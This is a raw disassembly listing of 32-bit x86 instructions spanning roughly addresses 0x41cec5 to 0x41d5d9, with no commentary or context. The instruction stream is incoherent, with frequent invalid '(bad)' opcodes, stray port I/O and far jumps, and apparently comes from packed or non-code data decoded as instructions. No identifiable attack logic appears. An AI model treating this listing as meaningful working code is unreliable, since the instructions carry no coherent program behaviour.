  41cec5:	pop    esp
  41cec6:	mov    edx,0xa5a5897c
  41cecb:	and    eax,0xb8a6a6a6
  41ced0:	jb     0x41cf3b
  41ced2:	xchg   ebp,eax
  41ced3:	jecxz  0x41ce68
  41ced5:	arpl   WORD PTR [esi],bx
  41ced7:	ds jle 0x41cf26
  41ceda:	scas   eax,DWORD PTR es:[edi]
  41cedb:	(bad)  [ebp+0x71]
  41cede:	jno    0x41ce71
  41cee0:	cdq    
  41cee1:	fstp   DWORD PTR [ecx]
  41cee3:	sbb    ah,BYTE PTR [edi+0x67]
  41cee6:	add    al,0x51
  41cee8:	enter  0x3860,0xd4
  41ceec:	leave  
  41ceed:	push   eax
  41ceee:	in     eax,0xa
  41cef0:	push   edi
  41cef1:	scas   eax,DWORD PTR es:[edi]
  41cef2:	pop    ebp
  41cef3:	gs ja  0x41cf6d
  41cef6:	xchg   edi,eax
  41cef7:	inc    edi
  41cef8:	nop    DWORD PTR [eax-0x2d384849]
  41ceff:	loop   0x41cf33
  41cf01:	jae    0x41cf76
  41cf03:	mov    bl,0xb4
  41cf05:	fistp  DWORD PTR ds:0x386020fc
  41cf0b:	sbb    BYTE PTR [edx+0x2f1709a6],dl
  41cf11:	pop    esi
  41cf12:	bound  esp,QWORD PTR [ebp+0x65]
  41cf15:	test   ebx,edi
  41cf17:	imul   edi
  41cf19:	jae    0x41cef9
  41cf1b:	cmp    al,0xa7
  41cf1d:	pop    eax
  41cf1e:	sub    al,0x51
  41cf20:	sub    BYTE PTR [esi+0x3c],al
  41cf23:	pop    ecx
  41cf24:	jnp    0x41cee8
  41cf26:	out    0x8b,al
  41cf28:	out    0x2c,eax
  41cf2a:	sub    eax,0xd5ab532e
  41cf2f:	fcomp  st(6)
  41cf31:	fldenv [esi+0x6530eed3]
  41cf37:	ret    0x838f
  41cf3a:	rol    DWORD PTR [eax-0x6166b4cc],0x9e
  41cf41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf42:	pop    edx
  41cf43:	stos   DWORD PTR es:[edi],eax
  41cf44:	shr    ecx,1
  41cf46:	mov    ah,0x99
  41cf48:	pushf  
  41cf49:	call   0x3aa1:0x34d23206
  41cf50:	cmp    ebx,ecx
  41cf52:	icebp  
  41cf53:	jecxz  0x41cf04
  41cf55:	xor    dh,cl
  41cf57:	int    0x5f
  41cf59:	add    ch,BYTE PTR [edi]
  41cf5b:	inc    ebx
  41cf5c:	jb     0x41cf25
  41cf5e:	dec    edx
  41cf5f:	or     DWORD PTR [ecx-0x3e235415],0xbf694a7
  41cf69:	sub    al,BYTE PTR fs:[edi+0x7f3123f7]
  41cf70:	xchg   ebp,eax
  41cf71:	lahf   
  41cf72:	das    
  41cf73:	loope  0x41cfb5
  41cf75:	push   ecx
  41cf76:	dec    esi
  41cf77:	jb     0x41cf88
  41cf79:	fild   WORD PTR [ebx+0x7fc6a078]
  41cf7f:	minsd  xmm7,xmm5
  41cf83:	cdq    
  41cf84:	lahf   
  41cf85:	jmp    esi
  41cf87:	shr    DWORD PTR [ebx-0x63],1
  41cf8a:	adc    al,0xf4
  41cf8c:	pop    edx
  41cf8d:	and    eax,DWORD PTR [eax+0x1cb5b9b8]
  41cf93:	sbb    eax,0xaf19fbbf
  41cf98:	data16 mov ah,0x77
  41cf9b:	mov    ebp,ds
  41cf9d:	jmp    0x41cffd
  41cf9f:	adc    dh,BYTE PTR [edx]
  41cfa1:	in     al,0x83
  41cfa3:	int3   
  41cfa4:	xor    BYTE PTR [ebx+ebp*4-0xe68cc0b],bh
  41cfab:	mov    bl,0x5c
  41cfad:	outs   dx,BYTE PTR ds:[esi]
  41cfae:	mov    BYTE PTR [eax],dl
  41cfb0:	dec    eax
  41cfb1:	xor    ch,BYTE PTR [eax+0x74]
  41cfb4:	dec    ebp
  41cfb5:	fadd   DWORD PTR [edi]
  41cfb7:	dec    eax
  41cfb8:	jl     0x41cf52
  41cfba:	jg     0x41cfb4
  41cfbc:	punpckhbw mm7,mm6
  41cfbf:	loopne 0x41cff6
  41cfc1:	jbe    0x41cfc9
  41cfc3:	add    DWORD PTR [edi],eax
  41cfc5:	mov    ebx,0x2994a07b
  41cfca:	push   esp
  41cfcb:	fldenv [esi]
  41cfcd:	dec    ebx
  41cfce:	xor    edi,DWORD PTR [edx]
  41cfd0:	fisttp QWORD PTR [esi]
  41cfd2:	sbb    ecx,edi
  41cfd4:	ss cwde 
  41cfd6:	fwait
  41cfd7:	lahf   
  41cfd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfd9:	push   eax
  41cfda:	sub    BYTE PTR [eax+0x76],dh
  41cfdd:	jbe    0x41cfa9
  41cfdf:	lds    ecx,FWORD PTR [ebx-0x69]
  41cfe2:	pop    eax
  41cfe3:	pop    ebp
  41cfe4:	mov    ebp,0xe7cd8bc2
  41cfe9:	clc    
  41cfea:	mov    esi,0x14d4d4cf
  41cfef:	push   edi
  41cff0:	scas   eax,DWORD PTR es:[edi]
  41cff1:	pop    esi
  41cff2:	mov    eax,ds:0x74702c50
  41cff7:	je     0x41d041
  41cff9:	mov    bl,0x79
  41cffb:	into   
  41cffc:	in     al,dx
  41cffd:	int3   
  41cffe:	sbb    al,0xe3
  41d000:	xchg   ebx,eax
  41d001:	jecxz  0x41d01f
  41d003:	push   ds
  41d004:	out    dx,al
  41d005:	sar    DWORD PTR [edi+ebp*2],cl
  41d008:	inc    edx
  41d009:	push   es
  41d00a:	mov    bh,0x6e
  41d00c:	fbld   TBYTE PTR [ecx+0x38d1eddb]
  41d012:	cmp    eax,0x83863201
  41d017:	and    DWORD PTR [ebx-0xb],esp
  41d01a:	cmp    dl,BYTE PTR [ebx]
  41d01c:	adc    edi,DWORD PTR [edx-0x18220f65]
  41d022:	sbb    esp,DWORD PTR [ecx+ebp*2]
  41d025:	(bad)  
  41d026:	pusha  
  41d027:	shl    bl,1
  41d029:	shl    ch,cl
  41d02b:	sub    ecx,DWORD PTR [edi+ebp*8]
  41d02e:	fsub   QWORD PTR [ecx]
  41d030:	dec    ebp
  41d031:	adc    bh,BYTE PTR [edi+ebx*8+0x63]
  41d035:	repz stc 
  41d037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d038:	push   cs
  41d039:	xor    eax,0x1068989a
  41d03e:	add    al,0xf4
  41d040:	xchg   DWORD PTR [ebx+0x32],eax
  41d043:	je     0x41cfe7
  41d045:	shl    ah,1
  41d047:	aam    0x34
  41d049:	inc    ecx
  41d04a:	adc    BYTE PTR [eax-0x55],dl
  41d04d:	push   esi
  41d04e:	jns    0x41d040
  41d050:	loopne 0x41d053
  41d052:	int    0xf3
  41d054:	fnstsw WORD PTR es:[esi-0x61]
  41d058:	aaa    
  41d059:	fistp  QWORD PTR [ebx+eax*4-0x27]
  41d05d:	cdq    
  41d05e:	imul   ebp,edx,0x73733af5
  41d064:	mov    bl,0xec
  41d066:	in     eax,dx
  41d067:	out    dx,al
  41d068:	jno    0x41d0e2
  41d06a:	je     0x41d0b0
  41d06c:	scas   eax,DWORD PTR es:[edi]
  41d06d:	(bad)  [ebp+0x76]
  41d070:	xchg   si,ax
  41d072:	fwait
  41d073:	aaa    
  41d074:	scas   al,BYTE PTR es:[edi]
  41d075:	jecxz  0x41d0a0
  41d077:	mov    ah,0x3f
  41d079:	and    ecx,DWORD PTR [eax+ebp*2-0x450ba54a]
  41d080:	pop    ebp
  41d081:	mov    al,ch
  41d083:	add    bh,BYTE PTR [esi+0xc1fd3e7]
  41d089:	push   0x3e38b79d
  41d08e:	cmp    eax,DWORD PTR [ecx]
  41d090:	in     eax,0x31
  41d092:	xor    eax,0xa8f14939
  41d097:	fsub   DWORD PTR [ebp+0x200000]
  41d09d:	dec    ecx
  41d09e:	inc    esp
  41d09f:	inc    ecx
  41d0a0:	push   esp
  41d0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0a2:	pop    edx
  41d0a3:	mov    eax,ds:0xdef12a58
  41d0a8:	fnstsw WORD PTR [ebx-0x5f419194]
  41d0ae:	pop    edx
  41d0af:	lods   eax,DWORD PTR ds:[esi]
  41d0b0:	lock (bad) 
  41d0b2:	fwait
  41d0b3:	outs   dx,DWORD PTR ds:[esi]
  41d0b4:	repnz (bad) 
  41d0b6:	sbb    ebp,DWORD PTR [edi-0x2e]
  41d0b9:	in     eax,dx
  41d0ba:	neg    BYTE PTR [eax+0x60e39b9b]
  41d0c0:	jg     0x41d061
  41d0c2:	shl    DWORD PTR [eax-0x38],0xc4
  41d0c6:	les    eax,FWORD PTR [ecx+esi*2]
  41d0c9:	call   0x4f27:0x9d74feb2
  41d0d0:	lahf   
  41d0d1:	push   eax
  41d0d2:	stos   DWORD PTR es:[edi],eax
  41d0d3:	aad    0xf8
  41d0d5:	fcomp  st(3)
  41d0d7:	outs   dx,DWORD PTR ds:[esi]
  41d0d8:	jae    0x41d0cd
  41d0da:	out    0x2d,al
  41d0dc:	xchg   edx,eax
  41d0dd:	js     0x41d127
  41d0df:	sbb    al,0xf
  41d0e1:	test   eax,0xcb21558d
  41d0e6:	mov    eax,0xcd26fb79
  41d0eb:	inc    esi
  41d0ec:	xchg   ebx,eax
  41d0ed:	add    ebx,0x3
  41d0f0:	ret    0x6430
  41d0f3:	sbb    bh,al
  41d0f5:	cmp    bl,BYTE PTR [edx+edi*8]
  41d0f8:	hlt    
  41d0f9:	sub    DWORD PTR [ebx],ebp
  41d0fb:	sub    ebp,DWORD PTR [ebx]
  41d0fd:	sub    al,0x2e
  41d0ff:	sub    eax,0x9d636cf1
  41d104:	dec    esi
  41d105:	mov    bh,0xcb
  41d107:	sbb    ebp,DWORD PTR [edi-0x44]
  41d10a:	popa   
  41d10b:	sbb    dh,BYTE PTR [ecx-0x4b4b4e52]
  41d111:	test   bh,ah
  41d113:	sub    esi,edx
  41d115:	lahf   
  41d116:	outs   dx,BYTE PTR ds:[esi]
  41d117:	mov    dl,0x7a
  41d119:	in     eax,dx
  41d11a:	es mov ebx,0x7d8cfb87
  41d120:	jecxz  0x41d139
  41d122:	or     BYTE PTR [ebx+0x28802c94],dl
  41d128:	adc    DWORD PTR [esi+0x1f],0xffffffd2
  41d12c:	bound  ecx,QWORD PTR [esi+0x27]
  41d12f:	pusha  
  41d130:	xor    al,0xbd
  41d132:	xor    edi,0x99ec0e92
  41d138:	lock lahf 
  41d13a:	cwde   
  41d13b:	or     eax,DWORD PTR [ecx-0x4edb485f]
  41d141:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41d143:	add    eax,0x2228e781
  41d148:	pop    ds
  41d149:	retf   0x6749
  41d14c:	inc    ebp
  41d14d:	loope  0x41d1cc
  41d14f:	aas    
  41d150:	lock pmaxub mm6,QWORD PTR [edi+0x46]
  41d155:	stc    
  41d156:	jge    0x41d174
  41d158:	scas   eax,DWORD PTR es:[edi]
  41d159:	xor    eax,0x7e0ff802
  41d15e:	pusha  
  41d15f:	cld    
  41d160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d161:	sub    al,bh
  41d163:	ud0    esp,DWORD PTR [ebp+0x15]
  41d167:	in     eax,0xe9
  41d169:	cdq    
  41d16a:	(bad)  
  41d16b:	nop
  41d16c:	daa    
  41d16d:	ja     0x41d175
  41d16f:	mov    al,BYTE PTR [esi+eiz*8+0x5e8f2d55]
  41d176:	aam    0x38
  41d178:	rcl    edi,1
  41d17a:	and    eax,0xd52ef9b1
  41d17f:	lahf   
  41d180:	mov    bh,0xfa
  41d182:	mov    al,0x7f
  41d184:	sahf   
  41d185:	push   edi
  41d186:	test   DWORD PTR [ecx],ebp
  41d188:	bsf    ebx,DWORD PTR [esi-0x34]
  41d18c:	inc    esp
  41d18d:	test   DWORD PTR ds:0xc7dfcbed,0xd30adcd4
  41d197:	xchg   ebx,eax
  41d198:	jne    0x41d190
  41d19a:	psadbw mm3,QWORD PTR [ecx+0x6560989c]
  41d1a1:	inc    ebp
  41d1a2:	imul   DWORD PTR [eax+0x5c8b162b]
  41d1a8:	mov    ebp,0xc32c8d76
  41d1ad:	and    al,0x5
  41d1af:	dec    ebp
  41d1b0:	push   eax
  41d1b1:	lods   eax,DWORD PTR ds:[esi]
  41d1b2:	push   esi
  41d1b3:	cdq    
  41d1b4:	popf   
  41d1b5:	cdq    
  41d1b6:	mov    eax,ds:0xb0722850
  41d1bb:	mov    edi,0x67d7b747
  41d1c0:	jns    0x41d233
  41d1c2:	mov    DWORD PTR [esi-0x59],ebp
  41d1c5:	ret    
  41d1c6:	xchg   ebx,eax
  41d1c7:	(bad)  
  41d1c8:	imul   esi,DWORD PTR [edx+edi*1+0x12c58a6d],0xffffff9e
  41d1d0:	push   edx
  41d1d1:	mov    ah,0x5b
  41d1d3:	sub    eax,0x1722a54a
  41d1d8:	das    
  41d1d9:	pop    ebp
  41d1da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1db:	push   esi
  41d1dc:	stos   DWORD PTR es:[edi],eax
  41d1dd:	xor    bh,BYTE PTR [ebx]
  41d1df:	aaa    
  41d1e0:	dec    edi
  41d1e1:	ins    DWORD PTR es:[edi],dx
  41d1e2:	lods   al,BYTE PTR ds:[esi]
  41d1e3:	into   
  41d1e4:	cli    
  41d1e5:	cli    
  41d1e6:	adc    esi,DWORD PTR [esi]
  41d1e8:	lahf   
  41d1e9:	cmp    eax,0xcf0f2943
  41d1ee:	imul   DWORD PTR [eax-0x49]
  41d1f1:	pop    ebx
  41d1f2:	hlt    
  41d1f3:	mov    edx,0x31f5ea3d
  41d1f8:	xchg   esi,eax
  41d1f9:	push   edi
  41d1fa:	cs push edx
  41d1fc:	sub    BYTE PTR [esi*2-0x31428ea7],dl
  41d203:	ja     0x41d1c3
  41d205:	repz cs das 
  41d208:	pop    edi
  41d209:	mov    esi,0x6f54ece4
  41d20e:	push   edx
  41d20f:	xor    dh,BYTE PTR [ebx]
  41d211:	cmp    ecx,DWORD PTR [ebx-0x57]
  41d214:	push   esp
  41d215:	gs gs test bx,sp
  41d21a:	ret    
  41d21b:	arpl   WORD PTR [esi],bx
  41d21d:	ds jl  0x41d1c8
  41d220:	jecxz  0x41d21b
  41d222:	or     DWORD PTR [edi-0x57],0xeddba25c
  41d229:	xor    bh,BYTE PTR [edi+0x2a2148b0]
  41d22f:	jo     0x41d2a5
  41d231:	jl     0x41d1ff
  41d233:	repz out 0xcf,eax
  41d236:	lea    esp,[ebx+0x4b]
  41d239:	jnp    0x41d220
  41d23b:	or     eax,DWORD PTR [ebp-0x34b4b4fe]
  41d241:	xor    al,0x1a
  41d243:	dec    ebp
  41d244:	sahf   
  41d245:	cmp    al,0x59
  41d247:	jecxz  0x41d241
  41d249:	inc    esp
  41d24a:	sti    
  41d24b:	daa    
  41d24c:	jmp    0xeb7b:0xdeeebaf5
  41d253:	ss std 
  41d255:	pop    esi
  41d256:	xchg   edi,eax
  41d257:	mov    ebx,0xb3cbb9df
  41d25c:	lea    ecx,ds:0xeae57014
  41d262:	adc    eax,0x99272726
  41d267:	fwait
  41d268:	fwait
  41d269:	addr16 data16 call 0x38d7:0x8fc7
  41d271:	cmp    eax,0x7cf3c139
  41d276:	push   esi
  41d277:	cs pop esi
  41d279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d27a:	xlat   BYTE PTR ds:[ebx]
  41d27b:	in     eax,dx
  41d27c:	mov    cl,0xb3
  41d27e:	std    
  41d27f:	xchg   edx,eax
  41d280:	shl    DWORD PTR [eax+0x40],0xa1
  41d284:	mov    al,ds:0xbc5d073b
  41d289:	js     0x41d214
  41d28b:	jmp    0x3c5ffc79
  41d290:	mov    eax,0x8cf379cf
  41d295:	ror    BYTE PTR [edi],0x59
  41d298:	cwde   
  41d299:	pop    edi
  41d29a:	pusha  
  41d29b:	addr16 ja 0x41d239
  41d29e:	cmc    
  41d29f:	cmc    
  41d2a0:	jne    0x41d2ac
  41d2a2:	lds    esp,FWORD PTR [edx]
  41d2a4:	sub    ebp,DWORD PTR [ebx]
  41d2a6:	pop    ss
  41d2a7:	test   eax,0x4d4ccb56
  41d2ac:	dec    esp
  41d2ad:	shr    BYTE PTR [edx-0x49],cl
  41d2b0:	cmp    DWORD PTR [edi+0x34],ebp
  41d2b3:	mov    eax,0xb9856170
  41d2b8:	test   DWORD PTR [ecx+0x1e],edi
  41d2bb:	ds js  0x41d2fe
  41d2be:	scas   eax,DWORD PTR es:[edi]
  41d2bf:	fbld   TBYTE PTR [edi+0x7a]
  41d2c2:	jp     0x41d25e
  41d2c4:	inc    esi
  41d2c5:	mov    ds:0x3ac6c6c1,eax
  41d2ca:	sahf   
  41d2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2cc:	cwde   
  41d2cd:	cwde   
  41d2ce:	cwde   
  41d2cf:	fs ins DWORD PTR es:[edi],dx
  41d2d1:	in     eax,dx
  41d2d2:	xor    DWORD PTR [edi-0x4329d8d9],esp
  41d2d8:	cmp    bh,BYTE PTR [edx+edi*1]
  41d2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2dc:	cmp    BYTE PTR [ecx],dh
  41d2de:	dec    ebp
  41d2df:	stc    
  41d2e0:	imul   edi,edi,0xb
  41d2e3:	rcr    ebx,cl
  41d2e5:	jmp    0x41d2ab
  41d2e7:	popa   
  41d2e8:	dec    esi
  41d2e9:	and    esp,DWORD PTR [esi-0x4bccbfcc]
  41d2ef:	cmp    DWORD PTR [edx+edx*8-0x75b083a2],edx
  41d2f6:	jle    0x41d278
  41d2f8:	sbb    BYTE PTR [edi-0x141f89cd],0xff
  41d2ff:	jge    0x41d2a4
  41d301:	in     eax,0x7d
  41d303:	in     eax,0x9c
  41d305:	jmp    0x41d2f0
  41d307:	out    dx,eax
  41d308:	push   edx
  41d309:	or     DWORD PTR [eax],0x42
  41d30c:	add    eax,0xf4fc7f5d
  41d311:	scas   eax,DWORD PTR es:[edi]
  41d312:	jge    0x41d30f
  41d314:	in     al,0xef
  41d316:	jg     0x41d348
  41d318:	fdivr  st(2),st
  41d31a:	jnp    0x41d357
  41d31c:	pop    esi
  41d31d:	imul   eax,DWORD PTR [ecx],0xfffffff0
  41d320:	rcr    DWORD PTR [edi+0x4a4ff899],cl
  41d326:	sub    DWORD PTR [ebp+0x3c4cca3b],0x60
  41d32d:	xor    ebp,DWORD PTR [edi+0x18a801c4]
  41d333:	sub    eax,0x931d49fe
  41d338:	inc    eax
  41d339:	or     bh,BYTE PTR [ebp+0x54]
  41d33c:	xchg   esi,eax
  41d33d:	xor    edi,DWORD PTR [ebp+0x70150184]
  41d343:	rol    BYTE PTR [ebx-0x2649514d],cl
  41d349:	inc    edx
  41d34a:	iret   
  41d34b:	push   esp
  41d34c:	jl     0x41d2d3
  41d34e:	push   eax
  41d34f:	cmp    al,0x6f
  41d351:	mov    dl,0x3a
  41d353:	jbe    0x41d399
  41d355:	out    dx,eax
  41d356:	retf   0x510f
  41d359:	pop    ds
  41d35a:	lahf   
  41d35b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d35c:	sbb    dl,bh
  41d35e:	adc    al,0xa
  41d360:	inc    ebp
  41d361:	push   0x63
  41d363:	xor    eax,0xd50ae52a
  41d368:	push   0xffffff95
  41d36a:	sub    al,0xcb
  41d36c:	sub    BYTE PTR [esi-0x333133b6],dl
  41d372:	shr    bh,cl
  41d374:	cmc    
  41d375:	hlt    
  41d376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d377:	sahf   
  41d378:	test   DWORD PTR [edx],eax
  41d37a:	push   ebx
  41d37b:	xor    esi,DWORD PTR [ebx]
  41d37d:	lods   al,BYTE PTR ds:[esi]
  41d37e:	cmp    eax,0x60e0e35e
  41d383:	lahf   
  41d384:	xor    al,0x4b
  41d386:	sub    DWORD PTR [esi],edx
  41d388:	mov    bl,BYTE PTR [edi+esi*2+0x1dda74da]
  41d38f:	push   esi
  41d390:	push   esi
  41d391:	cs mov al,0x7c
  41d394:	popa   
  41d395:	cdq    
  41d396:	xor    BYTE PTR [eax],cl
  41d398:	pop    ecx
  41d399:	pop    eax
  41d39a:	pop    edx
  41d39b:	out    0xfc,al
  41d39d:	mov    esp,0x1c1d1c5
  41d3a2:	imul   ebx,DWORD PTR [edx-0x4c7050b0],0x469362f5
  41d3ac:	mov    bl,0x49
  41d3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3af:	frstor [esi-0xb]
  41d3b2:	retf   0xa615
  41d3b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3b7:	sub    DWORD PTR [ebx+ecx*2],edx
  41d3ba:	int3   
  41d3bb:	into   
  41d3bc:	into   
  41d3bd:	jno    0x41d43b
  41d3bf:	jl     0x41d385
  41d3c1:	mov    ecx,ebp
  41d3c3:	pop    ss
  41d3c4:	hlt    
  41d3c5:	sti    
  41d3c6:	jge    0x41d34a
  41d3c8:	xor    BYTE PTR [eax+0x6cd268d1],ah
  41d3ce:	ss or  bl,al
  41d3d1:	nop
  41d3d2:	mov    edx,DWORD PTR [edi]
  41d3d4:	das    
  41d3d5:	push   ebx
  41d3d6:	sub    BYTE PTR [esi],dl
  41d3d8:	sub    BYTE PTR [esi],dl
  41d3da:	mov    ebp,DWORD PTR [ebp*1-0x40444ed2]
  41d3e1:	(bad)  
  41d3e2:	shl    DWORD PTR [edi+0x3f3f394f],cl
  41d3e8:	addr16 popa 
  41d3ea:	jno    0x41d36d
  41d3ec:	jmp    0x41d3c5
  41d3ee:	je     0x41d3e3
  41d3f0:	nop
  41d3f1:	mov    edx,DWORD PTR [edi]
  41d3f3:	xchg   esi,eax
  41d3f4:	mov    DWORD PTR [edx],ecx
  41d3f6:	adc    edi,ebx
  41d3f8:	cli    
  41d3f9:	out    0x37,al
  41d3fb:	cmp    ah,bl
  41d3fd:	aas    
  41d3fe:	pusha  
  41d3ff:	sbb    bh,al
  41d401:	fdivr  QWORD PTR [esi-0x5656648b]
  41d407:	sub    esi,esp
  41d409:	out    0xe6,al
  41d40b:	cwde   
  41d40c:	pop    ebx
  41d40d:	cwde   
  41d40e:	out    0xd9,eax
  41d410:	mov    BYTE PTR [esi],0x1b
  41d413:	sbb    ebx,DWORD PTR [ebx]
  41d415:	xor    al,0x9b
  41d417:	out    0x2c,eax
  41d419:	das    
  41d41a:	das    
  41d41b:	mov    bl,0xba
  41d41d:	jp     0x41d3b8
  41d41f:	inc    edx
  41d420:	mov    eax,ds:0x2cdcdcc8
  41d425:	jno    0x41d443
  41d427:	jmp    0x41d407
  41d429:	add    ecx,esi
  41d42b:	nop
  41d42c:	icebp  
  41d42d:	icebp  
  41d42e:	or     ebx,edx
  41d430:	nop
  41d431:	hlt    
  41d432:	test   BYTE PTR [ebx+0x18cd53b3],dh
  41d438:	data16 loop 0x41d4aa
  41d43b:	fdivr  QWORD PTR [ecx+eax*2-0x1883996a]
  41d442:	popf   
  41d443:	outs   dx,DWORD PTR ds:[esi]
  41d444:	mov    bl,0xb5
  41d446:	mov    ch,0x4d
  41d448:	sbb    BYTE PTR [esi+0x77dbadc],al
  41d44e:	aas    
  41d44f:	lock sub DWORD PTR [ebp+eax*1+0x12],eax
  41d454:	mov    bl,0x41
  41d456:	push   0xffffff96
  41d458:	fdivr  QWORD PTR gs:[ecx-0x1d]
  41d45c:	or     eax,0x1e2ddbce
  41d461:	mov    esp,0xf9c68f77
  41d466:	cmp    DWORD PTR [ebx-0x346b4ccd],esi
  41d46c:	and    eax,0xa53c9fd6
  41d471:	shr    DWORD PTR [eax+0x32],1
  41d474:	cmp    DWORD PTR [ecx],edi
  41d476:	leave  
  41d477:	int3   
  41d478:	in     al,dx
  41d479:	sub    al,0xb5
  41d47b:	push   0xffffff85
  41d47d:	sub    al,0x85
  41d47f:	dec    esi
  41d480:	mov    bh,0xc3
  41d482:	pop    eax
  41d483:	mov    ch,0xc6
  41d485:	int    0x5b
  41d487:	mov    bh,0x38
  41d489:	(bad)  
  41d48b:	jecxz  0x41d485
  41d48d:	clc    
  41d48e:	cwde   
  41d48f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d490:	in     eax,0xb
  41d492:	and    al,0x69
  41d494:	retf   0xd6d6
  41d497:	dec    ebx
  41d498:	push   0xffffffd5
  41d49a:	sbb    dh,BYTE PTR [ebp+0x5b5b1ab1]
  41d4a0:	mov    ebx,0x5c136304
  41d4a5:	fdivr  st,st(4)
  41d4a7:	gs (bad) 
  41d4a9:	mov    esi,0x61649bf3
  41d4ae:	scas   al,BYTE PTR es:[edi]
  41d4af:	adc    BYTE PTR [edx+0x3ea68614],dl
  41d4b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4b6:	adc    al,0xe8
  41d4b8:	iret   
  41d4b9:	add    cl,BYTE PTR [edi+0x33]
  41d4bc:	ins    DWORD PTR es:[edi],dx
  41d4bd:	call   0xd4aaf2d
  41d4c2:	pushf  
  41d4c3:	xchg   edi,eax
  41d4c4:	jl     0x41d4c6
  41d4c6:	aas    
  41d4c7:	enter  0x4111,0x9a
  41d4cb:	jmp    0x996a6938
  41d4d0:	ror    BYTE PTR [ecx],0x19
  41d4d3:	dec    edx
  41d4d4:	mov    eax,0x38600830
  41d4d9:	sbb    BYTE PTR [esi+edi*8-0x28],dl
  41d4dd:	out    0x6f,eax
  41d4df:	(bad)  
  41d4e0:	mov    ch,0x9f
  41d4e2:	(bad)  
  41d4e3:	in     eax,dx
  41d4e4:	std    
  41d4e5:	xlat   BYTE PTR ds:[ebx]
  41d4e6:	mov    dh,0x42
  41d4e8:	lock mov ch,0x15
  41d4eb:	add    bh,cl
  41d4ed:	jg     0x41d4e0
  41d4ef:	aas    
  41d4f0:	lahf   
  41d4f1:	push   esi
  41d4f2:	idiv   esi
  41d4f4:	out    dx,al
  41d4f5:	pop    edi
  41d4f6:	sub    BYTE PTR [ebp+0x17c8f2e3],dl
  41d4fc:	xchg   edx,eax
  41d4fd:	into   
  41d4fe:	out    0xfe,eax
  41d500:	dec    ebp
  41d501:	outs   dx,BYTE PTR ds:[esi]
  41d502:	add    cl,BYTE PTR [eax+0x3e184f73]
  41d508:	retf   
  41d509:	je     0x41d51d
  41d50b:	nop
  41d50c:	in     al,0xfe
  41d50e:	dec    ebx
  41d50f:	push   es
  41d510:	loope  0x41d542
  41d512:	sbb    DWORD PTR [ebp-0x1df8b95a],0xfffffff0
  41d519:	xchg   ecx,eax
  41d51a:	mov    ah,0xcf
  41d51c:	mov    al,0x0
  41d51e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d51f:	rol    DWORD PTR [ebx],cl
  41d521:	sub    ch,ch
  41d523:	inc    edi
  41d524:	in     al,dx
  41d525:	(bad)  
  41d526:	outs   dx,DWORD PTR ds:[esi]
  41d527:	push   ebx
  41d528:	popf   
  41d529:	cwde   
  41d52a:	addr16 jb 0x41d4d9
  41d52d:	int3   
  41d52e:	(bad)  
  41d530:	ds retf 0x59f3
  41d534:	xor    ch,cl
  41d536:	ds pop edi
  41d538:	mov    esi,0xd4e4c978
  41d53d:	adc    al,0xbe
  41d53f:	pop    ds
  41d540:	mov    al,0xbe
  41d542:	mov    cl,0xce
  41d544:	fldcw  WORD PTR [ecx+0xe1bccc9]
  41d54a:	imul   ebx,DWORD PTR [ebp+ebx*4-0x42a3af5f],0xa9729d7e
  41d555:	dec    eax
  41d556:	test   eax,0x230c2258
  41d55b:	or     eax,0xb9f981d9
  41d560:	jns    0x41d57c
  41d562:	out    0x4d,eax
  41d564:	push   ds
  41d565:	cmp    eax,0xbcf34fb8
  41d56a:	dec    ecx
  41d56b:	adc    BYTE PTR [esi-0x46],al
  41d56e:	dec    ebx
  41d56f:	push   eax
  41d570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d571:	inc    ebx
  41d572:	test   eax,0x62626652
  41d577:	xchg   edx,eax
  41d578:	xor    BYTE PTR [eax+edx*1],ch
  41d57b:	xchg   BYTE PTR [ecx],al
  41d57d:	rcl    ebx,cl
  41d57f:	push   ebx
  41d580:	ins    BYTE PTR es:[edi],dx
  41d581:	outs   dx,DWORD PTR ds:[esi]
  41d582:	ins    DWORD PTR es:[edi],dx
  41d583:	jmp    0x41d552
  41d585:	ds push cs
  41d587:	(bad)  
  41d588:	cwde   
  41d589:	popf   
  41d58a:	popf   
  41d58b:	jecxz  0x41d577
  41d58d:	aad    0x2b
  41d58f:	inc    esp
  41d590:	push   ecx
  41d591:	sub    DWORD PTR [ebx],0x1fd1af57
  41d597:	hlt    
  41d598:	fnstcw WORD PTR [esi+esi*8-0x74]
  41d59c:	addr16 iret 
  41d59e:	ss enter 0x94b2,0x28
  41d5a3:	mov    ch,al
  41d5a5:	cmc    
  41d5a6:	mov    edx,0xd302a214
  41d5ab:	rcl    DWORD PTR [ebx-0x3c],cl
  41d5ae:	dec    ecx
  41d5af:	ret    0xd6f6
  41d5b2:	push   cs
  41d5b3:	pop    esi
  41d5b4:	loopne 0x41d597
  41d5b6:	sti    
  41d5b7:	ds daa 
  41d5b9:	(bad)  
  41d5ba:	daa    
  41d5bb:	je     0x41d578
  41d5bd:	fiadd  DWORD PTR [esi-0x2c50e0e2]
  41d5c3:	ins    BYTE PTR es:[edi],dx
  41d5c4:	imul   esi,DWORD PTR ss:[edx+ebx*4],0xaf486184
  41d5cc:	fbld   TBYTE PTR [edi+0x3ea73cd9]
  41d5d2:	push   esi
  41d5d3:	arpl   WORD PTR [esi+0x66],sp
  41d5d6:	xchg   BYTE PTR [esi-0x5d],al
  41d5d9:	leave  
